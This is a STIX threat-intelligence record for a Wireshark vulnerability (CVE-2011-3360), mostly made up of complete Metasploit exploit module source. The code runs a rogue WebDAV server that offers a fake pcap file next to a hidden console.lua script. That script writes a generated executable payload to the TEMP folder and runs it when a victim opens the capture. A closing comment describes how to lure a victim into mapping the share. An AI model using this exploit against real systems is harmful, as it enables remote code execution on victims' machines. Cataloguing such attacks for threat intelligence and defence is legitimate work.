{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--73b2159a-952f-4be5-8f25-a127840a703c",
    "created": "2024-08-14T16:46:56.992398Z",
    "modified": "2024-08-14T16:46:56.992402Z",
    "name": "\"Wireshark console.lua Pre-Loading Script Execution\"",
    "description": " This module exploits a vulnerability in Wireshark 1.6 or less. When opening a pcap file, Wireshark will actually check if there's a 'console.lua' file in the same directory, and then parse/execute the script if found.  Versions affected by this vulnerability: 1.6.0 to 1.6.1, 1.4.0 to 1.4.8  'License'        => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/misc/wireshark_lua.rb",
            "external_id": "wireshark_lua.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2011-3360"
        },
        {
            "source_name": "reference",
            "url": "https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=6136"
        },
        {
            "source_name": "reference",
            "url": "http://technet.microsoft.com/en-us/security/msvr/msvr11-014"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = ExcellentRanking\n\n  include Msf::Exploit::Remote::HttpServer::HTML\n  include Msf::Exploit::EXE\n\n  def initialize(info={})\n    super(update_info(info,\n      'Name'           => \"Wireshark console.lua Pre-Loading Script Execution\",\n      'Description'    => %q{\n          This module exploits a vulnerability in Wireshark 1.6 or less. When opening a\n        pcap file, Wireshark will actually check if there's a 'console.lua' file in the same\n        directory, and then parse/execute the script if found.  Versions affected by this\n        vulnerability: 1.6.0 to 1.6.1, 1.4.0 to 1.4.8\n      },\n      'License'        => MSF_LICENSE,\n      'Author'         =>\n        [\n          'Haifei Li',  #For reporting the vuln\n          'sinn3r',     #Metasploit\n        ],\n      'References'     =>\n        [\n          ['CVE', '2011-3360'],\n          ['OSVDB', '75347'],\n          ['URL', 'https://bugs.wireshark.org/bugzilla/show_bug.cgi?id=6136'],\n          ['URL', 'http://technet.microsoft.com/en-us/security/msvr/msvr11-014']\n        ],\n      'Payload'        =>\n        {\n          'BadChars' => \"\\x00\",\n        },\n      'DefaultOptions'  =>\n        {\n          'EXITFUNC' => \"none\"\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          ['Wireshark 1.6.1 or less', {}],\n        ],\n      'Privileged'     => false,\n      'DisclosureDate' => '2011-07-18',  #Didn't go public until 2011-09-21 though\n      'DefaultTarget'  => 0))\n\n    register_options(\n      [\n        OptPort.new('SRVPORT',     [ true, \"The daemon port to listen on (do not change)\", 80 ]),\n        OptString.new('SHARENAME', [ true, \"The name of the top-level share.\", \"files\"]),\n        OptString.new('URIPATH',   [ true, \"The URI to use\", \"/\" ]),\n        OptString.new('FILENAME',  [ true, \"The name of the pcap file\", \"msf.pcap\"])\n      ])\n\n    deregister_options('SSL', 'SSLVersion') # WebDAV does not support SSL\n  end\n\n  def on_request_uri(cli, request)\n    case request.method\n    when 'OPTIONS'\n      process_options(cli, request)\n    when 'PROPFIND'\n      process_propfind(cli, request)\n    when 'GET'\n      process_get(cli, request)\n    else\n      print_status(\"#{request.method} => 404 (#{request.uri})\")\n      resp = create_response(404, \"Not Found\")\n      resp.body = \"\"\n      resp['Content-Type'] = 'text/html'\n      cli.send_response(resp)\n    end\n  end\n\n  def process_get(cli, request)\n    print_status(\"URI requested: #{request.uri.to_s}\")\n    if request.uri =~ /\\.lua$/\n      # Load lua script\n      print_status(\"Sending lua script\")\n      send_response(cli, @p, {'Content-Type'=>'application/octet-stream'})\n    elsif request.uri =~ /#{datastore['FILENAME']}/\n      # Load an empty pcap file\n      # Format reference: http://wiki.wireshark.org/Development/LibpcapFileFormat\n      pcap = ''\n      pcap << \"\\xd4\\xc3\\xb2\\xa1\"  #Magic number\n      pcap << \"\\x02\\x00\"          #Major version number\n      pcap << \"\\x04\\x00\"          #Minor version number\n      pcap << \"\\x00\\x00\\x00\\x00\"  #GMT to local correction\n      pcap << \"\\x00\\x00\\x00\\x00\"  #Accuracy of timestamp\n      pcap << \"\\xff\\xff\\x00\\x00\"  #Maxlength of captured packets in octets\n      pcap << \"\\x01\\x00\\x00\\x00\"  #Data length type\n      print_status(\"Sending fake pcap file\")\n      send_response(cli, pcap, {'Content-Type'=>'application/octet-stream'})\n    else\n      # Don't know the request, return not found\n      print_error(\"Don't care about this file, 404\")\n      send_not_found(cli)\n    end\n    return\n  end\n\n  def process_options(cli, request)\n    vprint_status(\"OPTIONS #{request.uri}\")\n    headers = {\n      'MS-Author-Via' => 'DAV',\n      'DASL'          => '<DAV:sql>',\n      'DAV'           => '1, 2',\n      'Allow'         => 'OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH',\n      'Public'        => 'OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK',\n      'Cache-Control' => 'private'\n    }\n\n    resp = create_response(207, \"Multi-Status\")\n    headers.each_pair {|k,v| resp[k] = v }\n    resp.body = ''\n    resp['Content-Type'] = 'text/xml'\n    cli.send_response(resp)\n  end\n\n  def process_propfind(cli, request)\n    path = request.uri\n    vprint_status(\"Received WebDAV PROPFIND request: #{path}\")\n    body = ''\n\n    if path !~ /\\/$/\n      if path.index(\".\")\n        print_status(\"Sending 404 for #{path} ...\")\n        resp = create_response(404, \"Not Found\")\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n        return\n      else\n        print_status(\"Sending 301 for #{path} ...\")\n        resp = create_response(301, \"Moved\")\n        resp[\"Location\"] = path + \"/\"\n        resp['Content-Type'] = 'text/html'\n        cli.send_response(resp)\n        return\n      end\n    end\n\n    print_status(\"Sending directory multistatus for #{path} ...\")\n\n    body = <<-BODY\n    <?xml version=\"1.0\" encoding=\"utf-8\"?>\n    <D:multistatus xmlns:D=\"DAV:\" xmlns:b=\"urn:uuid:c2f41010-65b3-11d1-a29f-00aa00c14882/\">\n    <D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n    <D:href>#{path}</D:href>\n    <D:propstat>\n    <D:prop>\n    <lp1:resourcetype><D:collection/></lp1:resourcetype>\n    <lp1:creationdate>2010-07-19T20:29:42Z</lp1:creationdate>\n    <lp1:getlastmodified>Mon, 19 Jul 2010 20:29:42 GMT</lp1:getlastmodified>\n    <lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n    <D:supportedlock>\n    <D:lockentry>\n    <D:lockscope><D:exclusive/></D:lockscope>\n    <D:locktype><D:write/></D:locktype>\n    </D:lockentry>\n    <D:lockentry>\n    <D:lockscope><D:shared/></D:lockscope>\n    <D:locktype><D:write/></D:locktype>\n    </D:lockentry>\n    </D:supportedlock>\n    <D:lockdiscovery/>\n    <D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n    </D:prop>\n    <D:status>HTTP/1.1 200 OK</D:status>\n    </D:propstat>\n    </D:response>\n    BODY\n\n    body = body.gsub(/^ {4}/, '')\n\n    if request[\"Depth\"].to_i > 0\n      if path.scan(\"/\").length < 2\n        body << generate_shares(path)\n      else\n        #Set filenames, and set the hidden attribute\n        filenames =\n          [\n            ['console.lua', true],\n            [datastore['FILENAME'], false]\n          ]\n        body << generate_files(path, filenames)\n      end\n    end\n\n    body << \"</D:multistatus>\"\n\n    body.gsub!(/\\t/, '')\n\n    # send the response\n    resp = create_response(207, \"Multi-Status\")\n    resp.body = body\n    resp['Content-Type'] = 'text/xml; charset=\"utf8\"'\n    cli.send_response(resp)\n  end\n\n  def gen_timestamp(ttype=nil)\n    ::Time.now.strftime(\"%a, %d %b %Y %H:%M:%S GMT\")\n  end\n\n  def gen_datestamp(ttype=nil)\n    ::Time.now.strftime(\"%Y-%m-%dT%H:%M:%SZ\")\n  end\n\n  def generate_shares(path)\n    share_name = datastore['SHARENAME']\n    share = <<-SHARE\n    <D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n    <D:href>#{path}#{share_name}/</D:href>\n    <D:propstat>\n    <D:prop>\n    <lp1:resourcetype><D:collection/></lp1:resourcetype>\n    <lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n    <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n    <lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n    <D:supportedlock>\n    <D:lockentry>\n    <D:lockscope><D:exclusive/></D:lockscope>\n    <D:locktype><D:write/></D:locktype>\n    </D:lockentry>\n    <D:lockentry>\n    <D:lockscope><D:shared/></D:lockscope>\n    <D:locktype><D:write/></D:locktype>\n    </D:lockentry>\n    </D:supportedlock>\n    <D:lockdiscovery/>\n    <D:getcontenttype>httpd/unix-directory</D:getcontenttype>\n    </D:prop>\n    <D:status>HTTP/1.1 200 OK</D:status>\n    </D:propstat>\n    </D:response>\n    SHARE\n    share = share.gsub(/^ {4}/, '')\n    return share\n  end\n\n  def generate_files(path, items)\n    trail = path.split(\"/\")\n    return \"\" if trail.length < 2\n\n    files = \"\"\n    items.each do |f, hide|\n      h = hide ? '1' : '0'\n      files << <<-FILES\n      <D:response xmlns:lp1=\"DAV:\" xmlns:lp2=\"http://apache.org/dav/props/\">\n      <D:href>#{path}#{f}</D:href>\n      <D:propstat>\n      <D:prop>\n      <lp1:resourcetype/>\n      <lp1:creationdate>#{gen_datestamp}</lp1:creationdate>\n      <lp1:getcontentlength>#{rand(0x10000)+120}</lp1:getcontentlength>\n      <lp1:getlastmodified>#{gen_timestamp}</lp1:getlastmodified>\n      <lp1:getetag>\"#{\"%.16x\" % rand(0x100000000)}\"</lp1:getetag>\n      <lp2:executable>T</lp2:executable>\n      <D:supportedlock>\n      <D:lockentry>\n      <D:lockscope><D:exclusive/></D:lockscope>\n      <D:locktype><D:write/></D:locktype>\n      </D:lockentry>\n      <D:lockentry>\n      <D:lockscope><D:shared/></D:lockscope>\n      <D:locktype><D:write/></D:locktype>\n      </D:lockentry>\n      </D:supportedlock>\n      <D:lockdiscovery/>\n      <D:getcontenttype>application/octet-stream</D:getcontenttype>\n      </D:prop>\n      <D:status>HTTP/1.1 200 OK</D:status>\n      <D:ishidden b:dt=\"boolean\">#{h}</D:ishidden>\n      </D:propstat>\n      </D:response>\n      FILES\n    end\n\n    files = files.gsub(/^ {6}/, '')\n\n    return files\n  end\n\n  def get_lua_payload\n    # Generate our executable payload, and then convert every byte\n    # in decimal format\n    p = generate_payload_exe\n    buf = ''\n    p.each_byte do |b|\n      buf << \"\\\\#{b.to_s}\"\n    end\n\n    # Create the lua script that contains our payload\n    var_payload_name = rand_text_alpha(5)\n    var_temp_name    = rand_text_alpha(5)\n    lua_script = <<-LUA\n    #{var_payload_name} = \"#{buf}\"\n\n    #{var_temp_name} = os.getenv(\"TEMP\") .. os.tmpname() .. \".exe\"\n    local f = io.open(#{var_temp_name}, \"wb\")\n    f:write(#{var_payload_name})\n    f:close()\n    os.execute(#{var_temp_name})\n    LUA\n\n    lua_script = lua_script.gsub(/^ {4}/, '')\n    return lua_script\n  end\n\n  def exploit\n    @p = get_lua_payload\n    super\n  end\nend\n\n=begin\nExample of how to open the share:\nMy Computer -> Tools -> Map Network Driver -> Sign up for online storage or\nconnect to a network server -> Choose another network location ->\nenter the network address\n\nOn an unpatched XP SP3 (and other Windows systems), the ideal URI format is like this:\nhttp://192.168.1.11/\nBut on a fully patched XP SP3, the same URI format will not work. Windows will try to list\nthe share via SMB, and the victim will not see the share.  In this case, you should specify\nthe URI to like this:\nhttp://192.168.1.11/files\n=end\n",
    "x_mitre_disclosure_date": "2011-07-18,  #Didnt go public until 2011-09-21 though",
    "x_mitre_platforms": [
        "win'"
    ]
}